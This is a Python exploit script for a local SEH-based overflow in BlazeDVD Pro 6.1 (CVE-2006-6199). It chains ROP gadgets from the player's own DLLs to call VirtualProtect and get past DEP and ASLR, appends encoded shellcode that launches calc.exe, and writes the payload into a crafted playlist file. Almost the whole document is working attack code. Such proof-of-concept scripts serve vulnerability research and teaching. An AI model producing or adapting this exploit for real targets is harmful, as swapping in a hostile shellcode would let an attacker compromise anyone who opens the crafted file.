#!/usr/bin/python
#
# Exploit Title:       BlazeDVD Pro 6.1 Local SEH Based Overflow (DEP/ASLR Bypass) 
# Author:
#	           $$$$$$\  $$\                       $$\           
#	          $$$ __$$\ $$ |                      $$ |          
#	$$$$$$$\  $$$$\ $$ |$$$$$$$\   $$$$$$\   $$$$$$$ |$$\   $$\ 
#	$$  __$$\ $$\$$\$$ |$$  __$$\ $$  __$$\ $$  __$$ |$$ |  $$ |
#	$$ |  $$ |$$ \$$$$ |$$ |  $$ |$$ /  $$ |$$ /  $$ |$$ |  $$ |
#	$$ |  $$ |$$ |\$$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
#	$$ |  $$ |\$$$$$$  /$$$$$$$  |\$$$$$$  |\$$$$$$$ |\$$$$$$$ |
#	\__|  \__| \______/ \_______/  \______/  \_______| \____$$ |
#							  $$\   $$ |
#   email: n0body@hackerzvoice.net			  \$$$$$$  |
#  							   \______/               
#
# Date:				22/07/2013
# Download Link:		http://www.blazevideo.com/dvd-player/
# Version:			6.1
# Tested Platform:		Windows 7 x64 French
# OSVDB:			30770
# CVE:				2006-6199                                                                            
# Big thanks goes to the Corelan Team!                                   
from struct import pack

nseh = pack('<L',0x42424242)
seh = pack('<L',0x6031a275)	# ADD ESP,420 # RETN 0x10    ** [Configuration.dll] **

junk = "\x41"*280

rop = pack('<L',0x6403a214)	# POP EBP # RETN [MediaPlayerCtrl.dll]
rop += pack('<L',0x43434343)	# padding
rop += pack('<L',0x43434343)	# padding
rop += pack('<L',0x43434343)	# padding
rop += pack('<L',0x43434343)	# padding
rop += pack('<L',0x6403a214)	# skip 4 bytes [MediaPlayerCtrl.dll]
rop += pack('<L',0x6410a24c)	# POP EAX # RETN [NetReg.dll] 
rop += pack('<L',0xfffffdff)	# Value to negate, will become 0x00000201
rop += pack('<L',0x6404c4c3)	# NEG EAX # RETN [MediaPlayerCtrl.dll] 
rop += pack('<L',0x64016676)	# XCHG EAX,EBX # RETN [MediaPlayerCtrl.dll] 
rop += pack('<L',0x6162f066)	# POP EAX # RETN [EPG.dll] 
rop += pack('<L',0xffffffc0)	# Value to negate, will become 0x00000040
rop += pack('<L',0x6033d05a)	# NEG EAX # RETN [Configuration.dll] 
rop += pack('<L',0x64046c72)	# XCHG EAX,EDX # RETN [MediaPlayerCtrl.dll] 
rop += pack('<L',0x64040189)	# POP ECX # RETN [MediaPlayerCtrl.dll] 
rop += pack('<L',0x6406a068)	# &Writable location [MediaPlayerCtrl.dll]
rop += pack('<L',0x6032f756)	# POP EDI # RETN [Configuration.dll] 
rop += pack('<L',0x6404c083)	# RETN (ROP NOP) [MediaPlayerCtrl.dll]
rop += pack('<L',0x6402364a)	# POP ESI # RETN [MediaPlayerCtrl.dll] 
rop += pack('<L',0x6030db85)	# JMP [EAX] [Configuration.dll]
rop += pack('<L',0x6162b2eb)	# POP EAX # RETN [EPG.dll] 
rop += pack('<L',0x640542cc)	# ptr to &VirtualProtect() [IAT MediaPlayerCtrl.dll]
rop += pack('<L',0x6032c93b)	# PUSHAD # RETN [Configuration.dll] 
rop += pack('<L',0x603063f6)	# ptr to 'push esp # ret ' [Configuration.dll]

jump = "\x54\x58\x2d\x10\xff\xff\xff\xff\xe0"

junk2 = "\x43"*(608-(len(junk)+len(rop)+len(jump)))

# msfpayload windows/exec cmd=calc.exe exitfunc=process R | msfencode -b '\x00\x0a\x0d\x1a'
shellcode = ("\xb8\xdc\xa5\x1b\x4c\xd9\xf6\xd9\x74\x24\xf4\x5b\x31\xc9"
"\xb1\x33\x83\xeb\xfc\x31\x43\x0e\x03\x9f\xab\xf9\xb9\xe3"
"\x5c\x74\x41\x1b\x9d\xe7\xcb\xfe\xac\x35\xaf\x8b\x9d\x89"
"\xbb\xd9\x2d\x61\xe9\xc9\xa6\x07\x26\xfe\x0f\xad\x10\x31"
"\x8f\x03\x9d\x9d\x53\x05\x61\xdf\x87\xe5\x58\x10\xda\xe4"
"\x9d\x4c\x15\xb4\x76\x1b\x84\x29\xf2\x59\x15\x4b\xd4\xd6"
"\x25\x33\x51\x28\xd1\x89\x58\x78\x4a\x85\x13\x60\xe0\xc1"
"\x83\x91\x25\x12\xff\xd8\x42\xe1\x8b\xdb\x82\x3b\x73\xea"
"\xea\x90\x4a\xc3\xe6\xe9\x8b\xe3\x18\x9c\xe7\x10\xa4\xa7"
"\x33\x6b\x72\x2d\xa6\xcb\xf1\x95\x02\xea\xd6\x40\xc0\xe0"
"\x93\x07\x8e\xe4\x22\xcb\xa4\x10\xae\xea\x6a\x91\xf4\xc8"
"\xae\xfa\xaf\x71\xf6\xa6\x1e\x8d\xe8\x0e\xfe\x2b\x62\xbc"
"\xeb\x4a\x29\xaa\xea\xdf\x57\x93\xed\xdf\x57\xb3\x85\xee"
"\xdc\x5c\xd1\xee\x36\x19\x2d\xa5\x1b\x0b\xa6\x60\xce\x0e"
"\xab\x92\x24\x4c\xd2\x10\xcd\x2c\x21\x08\xa4\x29\x6d\x8e"
"\x54\x43\xfe\x7b\x5b\xf0\xff\xa9\x38\x97\x93\x32\x91\x32"
"\x14\xd0\xed")

payload = junk + rop + jump + junk2 + nseh + seh + shellcode

file = open('exploit.plf','w')
file.write(payload)
file.close()
